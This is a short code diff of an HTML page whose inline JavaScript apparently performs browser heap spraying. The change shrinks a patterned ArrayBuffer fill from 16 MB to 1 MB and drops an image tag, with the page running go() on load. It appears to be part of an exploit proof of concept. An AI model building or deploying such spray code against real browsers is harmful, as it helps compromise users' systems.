@@ -21,7 +21,7 @@ function spray4(iter) {
 }
 spray4(10000);	
 
-var s=16*0x100000;
+var s=1*0x100000;
 var obj2= new ArrayBuffer(s); 
 var payload2=  new Uint32Array(obj2);
 for(var i=0; i<s/4; i++) payload2[i]=0x88000000+i;
@@ -35,5 +35,4 @@ function go(){
 
 <body onload="go()">
 	<iframe id="frm" width="800" height="600" src=""></iframe>
-	<img src="data.bmp"/>
 </body>
